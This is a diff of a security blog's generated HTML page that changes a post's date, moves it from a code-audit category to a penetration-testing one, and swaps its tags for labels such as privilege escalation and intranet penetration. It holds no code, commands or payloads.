-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-01-10
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-03-03
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/代码审计篇/" class="post-category" target="_blank">
-                                    代码审计篇
+                            <a href="/categories/渗透测试篇/" class="post-category" target="_blank">
+                                    渗透测试篇
                                 </a>
                             
                             
@@ -1625,20 +1611,24 @@ PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去�
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/PHP/" target="_blank">
-                        <span class="chip bg-color">PHP</span>
-                    </a>
-                    
-                    <a href="/tags/代码审计/" target="_blank">
-                        <span class="chip bg-color">代码审计</span>
-                    </a>
-                    
                     <a href="/tags/渗透测试/" target="_blank">
                         <span class="chip bg-color">渗透测试</span>
                     </a>
                     
-                    <a href="/tags/变量覆盖/" target="_blank">
-                        <span class="chip bg-color">变量覆盖</span>
+                    <a href="/tags/提权/" target="_blank">
+                        <span class="chip bg-color">提权</span>
+                    </a>
+                    
+                    <a href="/tags/域渗透/" target="_blank">
+                        <span class="chip bg-color">域渗透</span>
+                    </a>
+                    
+                    <a href="/tags/内网渗透/" target="_blank">
+                        <span class="chip bg-color">内网渗透</span>
+                    </a>
+                    
+                    <a href="/tags/环境搭建/" target="_blank">
+                        <span class="chip bg-color">环境搭建</span>
                     </a>
                     
                 </div>
